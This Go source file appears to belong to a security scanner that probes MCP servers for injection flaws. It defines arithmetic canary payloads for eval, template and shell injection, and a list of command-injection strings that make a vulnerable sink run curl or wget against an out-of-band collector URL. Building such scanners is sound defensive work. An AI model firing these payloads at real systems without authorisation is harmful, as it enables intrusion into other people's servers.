// Package mcpprobe holds the payload and out-of-band-callback kit shared by the
// MCP probe packages that attack a live server through the protocol layer —
// internal/probes/mcptool (the tool surface: tools/list + tools/call) and
// internal/probes/mcpprimitive (the content-bearing primitives: resources/read
// and prompts/get).
//
// Both surfaces are injection sinks reached by the same two payload families, so
// the canary construction, the shell-command payload set and the out-of-band
// collector live here rather than being duplicated per package. Only genuinely
// surface-independent pieces belong here: the tool-schema helpers (parameter
// parsing, benign argument synthesis) stay in mcptool, because prompt arguments
// carry no JSON-schema types and need their own builder.
package mcpprobe

import (
	"context"
	"crypto/rand"
	"encoding/hex"
	"fmt"
	"math/big"
	"strconv"
	"strings"
	"time"
)

// RandToken returns a random 16-hex-char token for canaries/OOB paths.
func RandToken() string {
	b := make([]byte, 8)
	if _, err := rand.Read(b); err != nil {
		return "augfallback000000"
	}
	return hex.EncodeToString(b)
}

// Canary is a computed-arithmetic injection canary. Each payload, if the target
// evaluates it, yields Marker (the product) in the output. The marker never
// appears literally in any payload, so a sink that merely echoes its input back
// cannot produce a false positive — the failure mode that makes echo-based
// detection useless against direct protocol calls.
type Canary struct {
	Marker   string
	Payloads []string
}

// PayloadFormats render the same multiplication across the injection classes we
// cover: bare expression/eval, template engines (SSTI), and shell.
var PayloadFormats = []string{
	"%d*%d",             // bare expression / eval / Python
	"{{%d*%d}}",         // Jinja / Twig / Nunjucks SSTI
	"${%d*%d}",          // JSP EL / Freemarker / shell-ish templates
	"#{%d*%d}",          // Ruby / Thymeleaf EL
	"$((%d*%d))",        // shell arithmetic expansion
	"; expr %d \\* %d",  // command injection via separator
	"$(expr %d \\* %d)", // command substitution
	"`expr %d \\* %d`",  // backtick command substitution
}

// OOBCmdFormats are OS-command-injection payload templates. Each embeds a single
// canary URL (the %s): a sink that passes the value to a shell (directly or via
// os/system, subprocess with shell=True, backtick eval, etc.) will fetch the URL,
// producing an out-of-band callback on the collector. This catches BLIND command
// injection — the sink runs but returns nothing to the client — which the
// computed-arithmetic PayloadFormats above cannot, since they rely on the result
// being reflected in-band. The separators cover POSIX shells (`;`, `|`, `&&`,
// newline, `$(...)`, backticks) and Windows cmd (`&`); curl and wget both ship on
// modern Linux/macOS and curl ships on Windows 10+. Every fetch carries a short
// timeout (`-m`/`-T`) so a target whose OS silently blackholes the connection to
// an unroutable collector can't hang a sequential probe for minutes.
var OOBCmdFormats = []string{
	"; curl -s -m 3 %s",        // statement separator
	"| curl -s -m 3 %s",        // pipe
	"& curl -s -m 3 %s",        // background / Windows cmd separator
	"&& curl -s -m 3 %s",       // conditional chain
	"$(curl -s -m 3 %s)",       // command substitution
	"`curl -s -m 3 %s`",        // backtick command substitution
	"; wget -qO- -T 3 %s",      // wget fallback where curl is absent
	"\ncurl -s -m 3 %s",        // newline injection (also covers direct-exec sinks)
	"' ; curl -s -m 3 %s ; #",  // break out of single-quoted context; # eats the wrapper's trailing quote
	"\" ; curl -s -m 3 %s ; #", // break out of double-quoted context; # eats the wrapper's trailing quote
}

// NewCanary builds a canary from two random factors. The product is ~9 digits,
// making a coincidental appearance in benign output vanishingly unlikely.
func NewCanary() Canary {
	a := randInt(100000, 999999)
	b := randInt(101, 999)
	c := Canary{Marker: strconv.Itoa(a * b)}
	c.Payloads = make([]string, len(PayloadFormats))
	for i, f := range PayloadFormats {
		c.Payloads[i] = fmt.Sprintf(f, a, b)
	}
	return c
}

// randInt returns a random int in [min, max). On the (practically impossible)
// RNG failure it falls back to min, which still yields a valid canary.
func randInt(minVal, maxVal int) int {
	n, err := rand.Int(rand.Reader, big.NewInt(int64(maxVal-minVal)))
	if err != nil {
		return minVal
	}
	return minVal + int(n.Int64())
}

// ShellProofURL rewrites a collector canary URL so that only actual shell
// execution reproduces the tracked token. It splices an empty command
// substitution ("$()") into the middle of the token: a POSIX shell evaluating the
// argument collapses "$()" to nothing, requesting the real /oob/<token> path the
// collector tracks — command-execution-specific proof a plain URL fetch cannot
// forge. A sink that instead extracts and fetches the literal URL from the
// argument text requests a "...$()..." path, whose token does not match the
// tracked one, so an SSRF / link-fetch sink cannot masquerade as command
// injection. (On Windows cmd.exe "$()" is not a no-op, so cmd-only sinks may be
// missed — a false negative, the safe direction.)
func ShellProofURL(url, token string) string {
	if len(token) < 2 {
		return url
	}
	mid := len(token) / 2
	obfuscated := token[:mid] + "$()" + token[mid:]
	return strings.Replace(url, token, obfuscated, 1)
}

// WaitForCallbacks sleeps for the grace period, honoring context cancellation.
// Callers use it after sending out-of-band payloads and before reconciling each
// attempt against what the collector saw.
func WaitForCallbacks(ctx context.Context, d time.Duration) {
	if d <= 0 {
		return
	}
	t := time.NewTimer(d)
	defer t.Stop()
	select {
	case <-t.C:
	case <-ctx.Done():
	}
}
